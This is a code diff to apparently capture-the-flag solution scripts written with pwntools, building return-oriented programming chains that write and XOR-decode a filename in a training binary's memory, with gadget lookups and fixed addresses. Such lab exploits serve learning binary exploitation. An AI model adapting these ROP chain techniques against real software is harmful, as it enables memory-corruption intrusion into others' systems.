@@ -123,7 +123,7 @@ pop_r12_pop_r13_pop_r14_pop_r15 = rop.find_gadget(['pop r12', 'pop r13', 'pop r1
 mov_qword_ptr_r13_r12 = 0x400634
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
 
-string_address = 0x601038
+string_address = exe.symbols['__bss_start']
 
 junk = 0xbeef
 
@@ -171,9 +171,9 @@ ret = rop.find_gadget(['ret'])[0]
 pop_r12_pop_r13_pop_r14_pop_r15 = rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
 mov_qword_ptr_r13_r12 = 0x400634
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-pop_r14_pop_r15 = rop.find_gadget(['pop r14', 'pop r15'])[0]
+pop_r15 = rop.find_gadget(['pop r15', 'ret'])[0]
 
-string_address = 0x601038
+string_address = exe.symbols['__bss_start']
 xor_byte = 0x20
 
 xor_byte_ptr_r15_r14b = 0x400628
@@ -199,8 +199,7 @@ payload = [
 
 for i in range(len(filename)):
     payload += [
-        p64(pop_r14_pop_r15),
-        p64(xor_byte),
+        p64(pop_r15),
         p64(string_address + i),
         p64(xor_byte_ptr_r15_r14b),
     ]
@@ -272,9 +271,9 @@ ret = rop.find_gadget(['ret'])[0]
 pop_r12_pop_r13_pop_r14_pop_r15 = rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
 mov_qword_ptr_r13_r12 = 0x400634
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-pop_r14_pop_r15 = rop.find_gadget(['pop r14', 'pop r15'])[0]
+pop_r15 = rop.find_gadget(['pop r15', 'ret'])[0]
 
-string_address = 0x601038
+string_address = exe.symbols['__bss_start']
 xor_byte = 0x20
 
 xor_byte_ptr_r15_r14b = 0x400628
@@ -300,8 +299,7 @@ payload = [
 
 for i in range(len(filename)):
     payload += [
-        p64(pop_r14_pop_r15),
-        p64(xor_byte),
+        p64(pop_r15),
         p64(string_address + i),
         p64(xor_byte_ptr_r15_r14b),
     ]
